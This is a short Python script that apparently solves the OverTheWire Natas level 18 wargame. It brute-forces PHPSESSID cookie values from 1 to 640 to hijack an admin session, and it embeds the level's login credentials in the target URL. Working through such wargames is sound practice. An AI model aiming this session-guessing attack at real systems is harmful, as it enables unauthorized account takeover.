import requests

target = 'http://natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP@natas18.natas.labs.overthewire.org/'
okaystr = 'You are an admin.'

for i in range(1, 641):
	print('trying..'+str(i))
	cookies = dict(PHPSESSID=str(i))
	r = requests.get(target, cookies=cookies)
	if r.content.find(okaystr) != -1:
		print(r.content)


